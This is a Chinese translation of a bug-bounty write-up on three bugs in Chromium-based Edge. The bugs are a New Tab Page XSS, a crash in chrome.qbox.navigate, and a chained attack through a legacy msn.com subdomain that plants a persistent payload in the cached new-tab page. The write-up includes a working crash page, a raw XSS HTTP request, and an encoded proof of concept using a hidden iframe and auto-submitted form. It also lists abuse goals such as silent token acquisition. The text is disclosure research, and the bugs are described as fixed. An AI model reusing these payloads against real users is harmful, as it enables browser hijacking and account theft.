> 原文链接: https://www.anquanke.com//post/id/195870 


# 基于Chromium内核的Edge多个漏洞分析


                                阅读量   
                                **1336344**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">2</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：
                                <br>原文地址：[https://leucosite.com/Edge-Chromium-EoP-RCE/](https://leucosite.com/Edge-Chromium-EoP-RCE/)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p3.ssl.qhimg.com/t01b4aa821495738f0a.jpg)](https://p3.ssl.qhimg.com/t01b4aa821495738f0a.jpg)



## 0x00 前言

微软将发布基于Chromium的Edge浏览器，[Chromium](https://www.chromium.org/Home)是Google开发的开源浏览器，目前已经有多款浏览器采用Chromium内核，比如Google Chrome浏览器，现在微软Edge也将加入这个大家族。

2019年8月20日，微软公布了针对新型Edge浏览器的[漏洞奖励计划](https://msrc-blog.microsoft.com/2019/08/20/announcing-the-microsoft-edge-insider-channels-bounty/)，根据该计划，只有在微软自己开发的代码中找到的bug才属于奖励范围，这意味着我们的攻击面比较小。但与此同时，官方的奖励也颇为丰盛（两倍于EdgeHTML的奖励）。也就是说，如果我们能在新型浏览器中找到一个bug，其价值最高可达30,000美元。

在本文中，我将介绍如何在该浏览器中挖到3个不同的bug，总共拿到了40,000美元奖励。此外我还是首位提交有效bug的研究人员，对此我自己也感到非常荣幸。



## 0x01 NTP XSS漏洞

在浏览器默认设置下，当用户打开浏览器或者打开新标签页时，首先会看到新选项卡页面（NTP）。新Edge浏览器的NTP页面有个独特之处：该页面实际上是一个在线网页，其url为：`https://ntp.msn.com/edge/ntp?locale=en&amp;dsp=1&amp;sp=Bing`。

与此类似，Firefox中包含`about:home`/`about:newtab`页面，Google Chrome中有个离线的`chrome-search://local-ntp/local-ntp.html`页面。Edge的地址与这两者不同，这一点比较关键，因为根据规则要求，我们需要找到微软自己代码中存在的bug，才能拿到奖励。

发现这个bug纯属意外。当我第一次打开新Edge浏览器时，并没有太关注NTP页面。我比较关注的是Edge中（相对Chromium而言）真正独特的一些功能，比如[Collections](https://blogs.windows.com/msedgedev/2019/12/09/improvements-collections-sync-microsoft-edge/)（集合）。当时该功能并不在奖励范围内，并且只能标志来启用。但我还是希望能研究一下，这样当后续纳入范围时就能派上用场。

我们可以把Collections当成更强大且功能更丰富的书签，当我们将网站加入Collections时，浏览器会提取标题、描述以及图像信息，以[Twitter卡片](https://developer.twitter.com/en/docs/tweets/optimize-with-cards/overview/summary)的样式呈现给用户。因此我做了一些测试，想看一下当我保存标题中包含HTML标签的网页时，Collections是否会渲染标题中的HTML。经过测试后，我发现浏览器并不会执行该操作。

因此测试结束后，我抽空休息了一会。第二天早上醒来，当我打开新Edge浏览器继续测试时，我看到了如下NTP界面：

[![](https://p2.ssl.qhimg.com/t01734466a8795d331f.png)](https://p2.ssl.qhimg.com/t01734466a8795d331f.png)

大家有没有注意到其中加粗的字母`a`？

由于这是一个新的浏览器，因此我访问过的站点基本上都会变成“最常访问站点”，被加到NTP常用站点中，并且没有过滤网页标题内容。此外，我还能畅行无阻执行JavaScript代码，因此可以使用简单的XSS payload。利用过程如下图所示：

[![](https://p2.ssl.qhimg.com/t019b85f467f4b5a4bb.gif)](https://p2.ssl.qhimg.com/t019b85f467f4b5a4bb.gif)

这个攻击路径比较重要，如果我们能在NTP上执行XSS攻击，能达到什么效果呢？NTP实际上是权限较高的一个页面，在基于Chromium的浏览器中，我们可以查看`chrome` Javascript对象来验证这一点。

我们可以比较普通网站与Edge设置页面中的`chrome`对象，如下图所示：

[![](https://p4.ssl.qhimg.com/t01bf48af511505a14f.png)](https://p4.ssl.qhimg.com/t01bf48af511505a14f.png)

显然，在`edge://settings/profiles`中该对象包含更多的函数，并且这些函数都是我们比较感兴趣的高权限函数，如果可以从正常的、非特权页面来访问这些函数，有可能实现函数滥用。

到目前为止，我们已经可以在正常的网页中，将Javascript代码注入高权限上下文中，从而实现权限提升（EoP）。下面我们来继续研究如何利用这个高权限上下文环境。



## 0x02 从EoP到潜在RCE

这一次我依然比较幸运。前面提到过，我们可以在`chrome` Javascript对象中找到特权函数。根据这一思路，我在`chrome`对象中搜索能够滥用的新的对象或者函数，希望能进一步利用这个EoP bug。

我找到了一个未公开的对象：`chrome.qbox`，但并没有在网上找到关于该对象的任何分析，因此我推测这是微软专用的一个对象。

[![](https://p3.ssl.qhimg.com/t01972900c859bd8f93.gif)](https://p3.ssl.qhimg.com/t01972900c859bd8f93.gif)

我还找到了一个特殊的函数：`chrome.qbox.navigate`，通过错误信息，我发现该函数期望接受的参数类型为`qbox.NavigationItem`对象。

经过多次探索后，我发现我们能将JSON对象传入该函数，只要JSON对象至少包含`url`及`id`元素即可。满足这个最低要求后，函数就不会抛出任何错误。

```
chrome.qbox.navigate(`{`id:0,url:""`}`)
```

目前进展不错，但还远远不够，我希望能通过这种方式弹出一些窗口，因此我不断尝试每个`id`及`url`值，最终找到了如下命令：

```
chrome.qbox.navigate(`{`id:999999,url:null`}`)
```

执行该命令后，Chromium版Edge浏览器窗口会消失不见。我检查了`crashdump`文件夹，找到了如下信息：

```
(69a4.723c): Access violation - code c0000005 (first/second chance not available)
ntdll!NtDelayExecution+0x14:
00007ffd`9fddc754 c3              ret
```

我猜测这里可能出现了`NULL`指针引用（意味着通常我们很难利用这种情况，但我相信凡事总有例外）。

```
rax=000001ff5651ba80 rbx=000001ff5651ba80 rcx=000001ff5651ba80
rdx=3265727574786574 rsi=000001ff5651ba80 rdi=0000009eb9bfd4f0
rip=00007ffd17814b40 rsp=0000009eb9bfd300 rbp=000001ff4fec30a0
 r8=000000000000008f  r9=0000000000000040 r10=0000000000000080
r11=0000009eb9bfd290 r12=000000000000006f r13=0000009eb9bfda90
r14=0000009eb9bfd478 r15=00000094b5d14064
iopl=0         nv up ei pl nz na po nc
cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010206
msedge!ChromeMain+0x9253e:
00007ffd`17814b40 488b02          mov     rax,qword ptr [rdx] ds:32657275`74786574=????????????????
Resetting default scope

FAULTING_IP: 
msedge!ChromeMain+9253e
00007ffd`17814b40 488b02          mov     rax,qword ptr [rdx]

EXCEPTION_RECORD:  (.exr -1)
ExceptionAddress: 00007ffd17814b40 (msedge!ChromeMain+0x000000000009253e)
   ExceptionCode: c0000005 (Access violation)
  ExceptionFlags: 00000000
NumberParameters: 2
   Parameter[0]: 0000000000000000
   Parameter[1]: ffffffffffffffff
Attempt to read from address ffffffffffffffff

DEFAULT_BUCKET_ID:  INVALID_POINTER_READ

PROCESS_NAME:  msedge.exe
```

根据上述信息，我们似乎找到了可利用的一个点。我在内存bug方面经验不够丰富，因此只能参考[MDN文档](https://developer.mozilla.org/en-US/docs/Mozilla/Security/Exploitable_crashes)来了解这方面内容。多次测试高权限下存在缺陷的`qbox.navigate`函数后，我成功复现了不同的崩溃特征，这表明我基本上能够通过web成功拿到一个可利用的崩溃点（RCE）。这已经非常接近于实战型PoC了（利用崩溃点是完全不同的另一个话题），目前我们能通过如下代码导致浏览器崩溃：

```
&lt;html&gt;
&lt;head&gt;
&lt;title&gt;test&lt;iframe/src=1/ onload=chrome.qbox.navigate(JSON.parse(unescape("%7B%22id%22%3A999999%2C%22url%22%3Anull%7D")))&gt;&lt;/title&gt;
&lt;body&gt;
q
&lt;/body&gt;
&lt;/html&gt;
```

微软确认了这个问题，并且同时确认了前面提到的XSS bug，通过这两个bug，我总共拿到了25,000美元。因此从技术上来讲，我已经在新版Edge中率先找到了2个bug！



## 0x03 控制NTP页面

根据前文描述，如果想通过web方式完成整个攻击路径，我们需要对`ntp.msn.com`发起XSS攻击。因此这里我们可以将`ntp.msn.com`当成渗透测试目标。由于该页面权限较高，因此只要找到XSS点，我们就能拿到一个浏览器bug。

如果访问`https://ntp.msn.com/compass/antp?locale=qab&amp;dsp=1&amp;sp=qabzz`，我们会看到无法正确加载的一个NTP页面，这一点在漏洞利用场景中比较关键。正常的NTP页面为`https://ntp.msn.com/edge/ntp?locale=en&amp;dsp=1&amp;sp=Bing`，大多数情况下，该页面在加载时会使用到某种缓存机制。

因此我运行[Burpsuite](https://portswigger.net/burp)，希望能在`https://ntp.msn.com/compass/antp?locale=qab&amp;dsp=1&amp;sp=qabzz`中找到一些bug。最终我发现如果设置了`domainId`这个cookie（这里不得不提到[ParamMiner](https://github.com/PortSwigger/param-miner)这个给力的工具），那么相应的值就会反馈到无法正确加载的NTP页面的`script`标签中（注意不是正常的NTP页面）。并且浏览器不会过滤我们输入的值（比如没有转义引号），因此我们可以使用这个cookie变量来注入代码。

使用cookie的优点在于，我们可以设置给定域名下所有子域名都可见的cookie。因此我只需要在任意一个MSN子域名中找到XSS点，就可以利用该域名设置cookie，然后在未正确加载的NTP页面中执行JS代码。经过一番探索后，我成功在`http://technology.za.msn.com`中找到了一个XSS点。由于该站点似乎是被官方遗忘的老域名，并且使用了非常古老的技术，因此现在已被官方下线。经过测试后，我发现只要我们发送精心构造的一个POST请求，该站点就会返回错误信息，其中包含导致错误的变量值，并且没有执行过滤操作。

我们可以使用如下HTTP请求触发XSS：

```
POST /pebble.asp?relid=172 HTTP/1.1
Host: technology.za.msn.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 20
Origin: http://technology.za.msn.com
Connection: close
Referer: http://technology.za.msn.com/pebble.asp?relid=172
Cookie: PublisherUserProfile=userprofileid=322220CC%2D9964%2D47F9%2DAE30%2D2222258E99A4; PublisherSession=uid=DIN2DWDWDFWWW7L3OHA5N6; ASPSESSIONIDSCCQSRDS=EOJQQDDFGGGEEPCPNFOBL; _ga=GA1.q.21062224016.4569609491; _gid=GA1.q.1840897607.1569609491; _gat=1; __utma=2qq77qq6.21qqqq4016.156qqqq9491.156960qqq.qqqqqq91.1; __utmb=201977236.1.10.1569609491; __utmc=201977236; __utmz=201977236.1569609491.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); __utmt=1; __gads=ID=qqqq5dd817qqqb4:T=1562229492:S=ALNI_MZUnsEhqqqqjxzklxqqqqqJHo1A
Upgrade-Insecure-Requests: 1

startnum=90'&lt;b&gt;xss&lt;/b&gt;

```

这里唯一的缺点在于，当出现错误时，服务器大约需要42秒才能响应。虽然有点不方便，但不影响大局。当服务端响应后，我们可以找到`&lt;b&gt;xss&lt;/b&gt;`信息，将其替换为常用的XSS payload就能执行Javascript。这里的头部中不包含`X-FRAME-OPTIONS`字段，因此我们可以在自己的站点中使用`IFRAME`来嵌入页面，通过隐藏的`IFRAME`发起所需的POST请求，触发XSS，这样受害者就看不到任何可疑的操作。

现在我们的攻击路径已经越来越清晰，然而前面提到过，我们一直在研究未能正确显示的NTP页面，而不是默认的（正常的）NTP页面，并且后者已被浏览器缓存。经过研究后，我发现浏览器会使用`localStorage`中的条目来缓存正常NTP页面。这并不一个大问题，由于未正确显示的NTP页面与正常NTP页面隶属同一个源，因此我可以访问`localStorage`条目，将最终的Javascript代码加入已缓存的HTML中，然后就能控制正常的NTP页面。

前面提到过，由于NTP页面权限较高，因此我们可以访问比较有趣的某些函数，从而执行各种操作。比如，我们可以通过恶意NTP页面执行如下操作：

1、诱骗用户使用微软账户登录。由于用户信任NTP页面，因此这是完美的攻击场景。

2、访问`chrome.authPrivate.acquireAccessTokenSilently`，可能成功获取用户访问令牌，以用户身份执行各种操作。

3、使用`chrome.authPrivate.getPrimaryAccountInfo(e=&gt;`{`console.dir(e)`}`)`获取用户隐私信息，比如邮箱地址以及账户等。

4、通过`chrome.embeddedSearch.searchBox.paste("file:///C://")`诱骗用户访问本地文件（需要诱骗用户按下回车键）。

5、使用`chrome.embeddedSearch.newTabPage.updateCustomLink(i,"http://www.g.com","http://www.g.com")`来编辑NTP中最常访问的站点（其中`i`为`0`到`9999`，确保我们已成功编辑所有页面）。

6、使用`chrome.ntpSettingsPrivate.setPref`来修改用户可能设置的各种NTP选项。

7、持续跟踪并伪造MSN内容。由于我们可以利用该bug持续控制NTP页面，因此可以用来跟踪用户行为（比如检查用户打开NTP的行为，或者解析已保存的最常访问站点），也可以像许多恶意扩展一样，注入虚假的广告。

虽然上述攻击场景有些比较繁琐，但足以证明我们可以完成很多攻击目标。

来总结一下完整的攻击链：

1、用户访问我们的恶意站点；

2、恶意站点通过隐藏的`IRAME`，向`technology.za.msn.com`发起POST请求，发送我们的XSS payload；

3、大约经过42秒后，`IFRAME`加载完成，我们成功在`technology.za.msn.com`上触发XSS payload；

4、利用`technology.za.msn.com`上的XSS创建cookie，其中包含`domain=.msn.com`以及`domainId`，后者包含我们的第二个payload；

5、当隐藏的`IFRAME`触发`onload`时，受害者被重定向到未能正确显示的NTP页面（`https://ntp.msn.com/compass/antp?locale=qab&amp;dsp=1&amp;sp=qabzz`）；

6、当`https://ntp.msn.com/compass/antp?locale=qab&amp;dsp=1&amp;sp=qabzz`加载完毕后，将渲染`domainId` cookie中包含的XSS payload；

7、XSS payload查找`localStorage`，将最终payload注入已缓存的HTML起始代码中。

此时我们已经成功控制了NTP页面，当用户打开新标签页时，就会持续触发最终payload。我通过新的MSRC漏洞报告网站将该bug反馈给微软，根据新Edge的奖励规则，我最终拿到了15,000美元的奖励。



## 0x04 PoC

由于存在各种字符限制，我在PoC中使用了大量编码，最终PoC如下：

```
&lt;html&gt;
&lt;head&gt;

&lt;body&gt;
&lt;iframe src="about:blank" id="qframe" name="msn" style="opacity:0.001"&gt;&lt;/iframe&gt;
&lt;h1&gt;Loading...(ETA 42secs)&lt;/h2&gt;
&lt;form id="qform" target="msn" action="http://technology.za.msn.com/pebble.asp?relid=172" method="post"&gt;
&lt;!--
Encoded payload (Executes in 'technology.za.msn.com')
---------------------------------------------------------------------
(qd = new Date()).setMonth(qd.getMonth() + 12);
document.cookie = "domainId=" + 
                  ('q"*' 
                  + unescape('%71%22%2a%66%75%6e%63%74%69%6f%6e%28%29%7b%66%6f%72%28%71%20%69%6e%20%6c%6f%63%61%6c%53%74%6f%72%61%67%65%29%7b%69%66%28%71%2e%69%6e%64%65%78%4f%66%28%27%6c%61%73%74%4b%6e%6f%77%6e%27%29%3e%2d%31%29%7b%77%69%74%68%28%71%6e%74%70%6f%62%6a%3d%4a%53%4f%4e%2e%70%61%72%73%65%28%6c%6f%63%61%6c%53%74%6f%72%61%67%65%5b%71%5d%29%29%7b%71%6e%74%70%6f%62%6a%2e%64%6f%6d%3d%75%6e%65%73%63%61%70%65%28%27%25%33%63%25%35%33%25%37%36%25%34%37%25%32%66%25%34%66%25%36%65%25%34%63%25%36%66%25%34%31%25%36%34%25%33%64%25%32%37%25%36%34%25%36%66%25%36%33%25%37%35%25%36%64%25%36%35%25%36%65%25%37%34%25%32%65%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%32%38%25%32%66%25%34%30%25%37%31%25%36%31%25%36%32%25%32%66%25%32%65%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%32%39%25%32%37%25%33%65%27%29%2b%71%6e%74%70%6f%62%6a%2e%64%6f%6d%7d%77%69%74%68%28%71%61%62%3d%71%6e%74%70%6f%62%6a%29%7b%6c%6f%63%61%6c%53%74%6f%72%61%67%65%5b%71%5d%3d%4a%53%4f%4e%2e%73%74%72%69%6e%67%69%66%79%28%71%61%62%29%7d%7d%7d%7d%28%29%2a%22%71') 
                  + '*"q') 
                  + ";expires=" 
                  + qd 
                  + ";domain=.msn.com;path=/";
---------------------------------------------------------------------
unescaped value above (Executes in broken 'ntp.msn.com'), this is all one line and im using with()`{``}` a lot because semicolon not allowed.
---------------------------------------------------------------------
function() `{`
        for (q in localStorage) `{`
        if (q.indexOf('lastKnown') &gt; -1) `{`
            with(qntpobj = JSON.parse(localStorage[q])) `{`
                qntpobj.dom = unescape('%3c%53%76%47%2f%4f%6e%4c%6f%41%64%3d%27%64%6f%63%75%6d%65%6e%74%2e%77%72%69%74%65%28%2f%40%71%61%62%2f%2e%73%6f%75%72%63%65%29%27%3e') + qntpobj.dom
            `}`
            with(qab = qntpobj) `{`
                localStorage[q] = JSON.stringify(qab)
            `}`
        `}`
    `}`

`}`()
---------------------------------------------------------------------
unescaped value above (Executes in normal 'ntp.msn.com')
---------------------------------------------------------------------
&lt;SvG/OnLoAd='document.write(/@qab/.source)'&gt;
--&gt;
  &lt;input  type="hidden" name="startnum" value="90'&lt;SvG/onLoAd=eval(unescape('%28%71%64%3d%20%6e%65%77%20%44%61%74%65%28%29%29%2e%73%65%74%4d%6f%6e%74%68%28%71%64%2e%67%65%74%4d%6f%6e%74%68%28%29%20%2b%20%31%32%29%3b%64%6f%63%75%6d%65%6e%74%2e%63%6f%6f%6b%69%65%3d%22%64%6f%6d%61%69%6e%49%64%3d%22%2b%28%75%6e%65%73%63%61%70%65%28%27%25%37%31%25%32%32%25%32%61%25%36%36%25%37%35%25%36%65%25%36%33%25%37%34%25%36%39%25%36%66%25%36%65%25%32%38%25%32%39%25%37%62%25%36%36%25%36%66%25%37%32%25%32%38%25%37%31%25%32%30%25%36%39%25%36%65%25%32%30%25%36%63%25%36%66%25%36%33%25%36%31%25%36%63%25%35%33%25%37%34%25%36%66%25%37%32%25%36%31%25%36%37%25%36%35%25%32%39%25%37%62%25%36%39%25%36%36%25%32%38%25%37%31%25%32%65%25%36%39%25%36%65%25%36%34%25%36%35%25%37%38%25%34%66%25%36%36%25%32%38%25%32%37%25%36%63%25%36%31%25%37%33%25%37%34%25%34%62%25%36%65%25%36%66%25%37%37%25%36%65%25%32%37%25%32%39%25%33%65%25%32%64%25%33%31%25%32%39%25%37%62%25%37%37%25%36%39%25%37%34%25%36%38%25%32%38%25%37%31%25%36%65%25%37%34%25%37%30%25%36%66%25%36%32%25%36%61%25%33%64%25%34%61%25%35%33%25%34%66%25%34%65%25%32%65%25%37%30%25%36%31%25%37%32%25%37%33%25%36%35%25%32%38%25%36%63%25%36%66%25%36%33%25%36%31%25%36%63%25%35%33%25%37%34%25%36%66%25%37%32%25%36%31%25%36%37%25%36%35%25%35%62%25%37%31%25%35%64%25%32%39%25%32%39%25%37%62%25%37%31%25%36%65%25%37%34%25%37%30%25%36%66%25%36%32%25%36%61%25%32%65%25%36%34%25%36%66%25%36%64%25%33%64%25%37%35%25%36%65%25%36%35%25%37%33%25%36%33%25%36%31%25%37%30%25%36%35%25%32%38%25%32%37%25%32%35%25%33%33%25%36%33%25%32%35%25%33%35%25%33%33%25%32%35%25%33%37%25%33%36%25%32%35%25%33%34%25%33%37%25%32%35%25%33%32%25%36%36%25%32%35%25%33%34%25%36%36%25%32%35%25%33%36%25%36%35%25%32%35%25%33%34%25%36%33%25%32%35%25%33%36%25%36%36%25%32%35%25%33%34%25%33%31%25%32%35%25%33%36%25%33%34%25%32%35%25%33%33%25%36%34%25%32%35%25%33%32%25%33%37%25%32%35%25%33%36%25%33%34%25%32%35%25%33%36%25%36%36%25%32%35%25%33%36%25%33%33%25%32%35%25%33%37%25%33%35%25%32%35%25%33%36%25%36%34%25%32%35%25%33%36%25%33%35%25%32%35%25%33%36%25%36%35%25%32%35%25%33%37%25%33%34%25%32%35%25%33%32%25%36%35%25%32%35%25%33%37%25%33%37%25%32%35%25%33%37%25%33%32%25%32%35%25%33%36%25%33%39%25%32%35%25%33%37%25%33%34%25%32%35%25%33%36%25%33%35%25%32%35%25%33%32%25%33%38%25%32%35%25%33%32%25%36%36%25%32%35%25%33%34%25%33%30%25%32%35%25%33%37%25%33%31%25%32%35%25%33%36%25%33%31%25%32%35%25%33%36%25%33%32%25%32%35%25%33%32%25%36%36%25%32%35%25%33%32%25%36%35%25%32%35%25%33%37%25%33%33%25%32%35%25%33%36%25%36%36%25%32%35%25%33%37%25%33%35%25%32%35%25%33%37%25%33%32%25%32%35%25%33%36%25%33%33%25%32%35%25%33%36%25%33%35%25%32%35%25%33%32%25%33%39%25%32%35%25%33%32%25%33%37%25%32%35%25%33%33%25%36%35%25%32%37%25%32%39%25%32%62%25%37%31%25%36%65%25%37%34%25%37%30%25%36%66%25%36%32%25%36%61%25%32%65%25%36%34%25%36%66%25%36%64%25%37%64%25%37%37%25%36%39%25%37%34%25%36%38%25%32%38%25%37%31%25%36%31%25%36%32%25%33%64%25%37%31%25%36%65%25%37%34%25%37%30%25%36%66%25%36%32%25%36%61%25%32%39%25%37%62%25%36%63%25%36%66%25%36%33%25%36%31%25%36%63%25%35%33%25%37%34%25%36%66%25%37%32%25%36%31%25%36%37%25%36%35%25%35%62%25%37%31%25%35%64%25%33%64%25%34%61%25%35%33%25%34%66%25%34%65%25%32%65%25%37%33%25%37%34%25%37%32%25%36%39%25%36%65%25%36%37%25%36%39%25%36%36%25%37%39%25%32%38%25%37%31%25%36%31%25%36%32%25%32%39%25%37%64%25%37%64%25%37%64%25%37%64%25%32%38%25%32%39%25%32%61%25%32%32%25%37%31%27%29%29%2b%22%3b%65%78%70%69%72%65%73%3d%22%2b%71%64%2b%22%3b%64%6f%6d%61%69%6e%3d%2e%6d%73%6e%2e%63%6f%6d%3b%70%61%74%68%3d%2f%22%3b'))"&gt;

&lt;/form&gt;
&lt;script&gt;
qframe.onload=e=&gt;`{`
 setTimeout(function()`{`
 location="https://ntp.msn.com/compass/antp?locale=qab&amp;dsp=1&amp;sp=qabzz";
 `}`,1000)
`}`

qform.submit();
&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
```

完整攻击过程如下（我剪掉了中间的42秒等待时间）：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t0157291d57c2d83407.gif)



## 0x05 参考资料

[https://twitter.com/spoofyroot/status/1171654526648094720](https://twitter.com/spoofyroot/status/1171654526648094720)
